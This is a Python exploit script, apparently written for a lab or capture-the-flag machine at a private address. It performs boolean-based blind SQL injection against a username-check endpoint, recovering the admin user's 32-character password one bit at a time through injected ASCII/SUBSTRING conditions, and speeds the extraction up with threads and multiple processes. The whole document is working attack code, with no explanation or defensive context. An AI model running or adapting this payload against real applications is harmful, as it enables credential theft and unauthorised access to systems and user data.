#!/usr/bin/env python3

import requests
import json
import sys
import time
from urllib.parse import quote_plus
from multiprocessing import Pool, cpu_count
from concurrent.futures import ThreadPoolExecutor

# Target setup
target = "admin"
url = "http://10.129.133.124/api/check-username.php"

def check_condition(query):
    """Sends a SQL injection query and returns True if the condition is met."""
    payload = quote_plus(f"{target}' AND ({query})-- -")
    response = requests.get(f"{url}?u={payload}")
    jsonResponse = json.loads(response.text)
    return jsonResponse['status'] == 'taken'

def get_character(i):
    """Fetches a single character using SQL-Anding, utilizing multiple threads."""
    c = 0
    bit_values = [2**p for p in range(7)]  # Precompute bitwise values

    # Use multithreading for bitwise queries
    with ThreadPoolExecutor(max_workers=7) as executor:
        results = list(executor.map(lambda p: (p, check_condition(f"ASCII(SUBSTRING(password,{i},1)) & {p} > 0")), bit_values))

    for p, result in results:
        if result:
            c |= p  # Set bits accordingly

    return chr(c)

# Start measuring time
start_time = time.time()

# Get the target's password length
length = 32 

# Use multiprocessing to parallelize character retrieval
print("[*] Password = ", end='', flush=True)
with Pool(cpu_count()) as pool:
    password = "".join(pool.map(get_character, range(1, length + 1)))

print(password)

# Stop measuring time and calculate elapsed time
end_time = time.time()
execution_time = end_time - start_time

print(f"\n[*] Code executed in {execution_time:.2f} seconds")
